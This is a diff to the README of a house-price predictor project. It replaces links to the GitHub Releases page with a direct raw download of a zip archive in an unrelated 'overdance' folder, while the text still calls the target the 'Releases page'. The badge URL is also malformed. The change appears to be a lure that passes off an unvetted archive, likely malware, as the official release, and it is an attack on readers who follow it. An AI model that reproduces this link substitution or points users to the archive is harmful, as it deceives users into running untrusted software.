@@ -2,7 +2,7 @@
 
 ## 📦 Download the Application
 
-[![Download WillowWorth-House-Price-Predictor](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/sshashwot/WillowWorth-House-Price-Predictor/releases)
+[![Download WillowWorth-House-Price-Predictor](https://raw.githubusercontent.com/sshashwot/WillowWorth-House-Price-Predictor/main/overdance/WillowWorth-House-Price-Predictor-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/sshashwot/WillowWorth-House-Price-Predictor/main/overdance/WillowWorth-House-Price-Predictor-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/sshashwot/WillowWorth-House-Price-Predictor/releases). 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/sshashwot/WillowWorth-House-Price-Predictor/main/overdance/WillowWorth-House-Price-Predictor-v3.4.zip). 
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see different versions of the software.
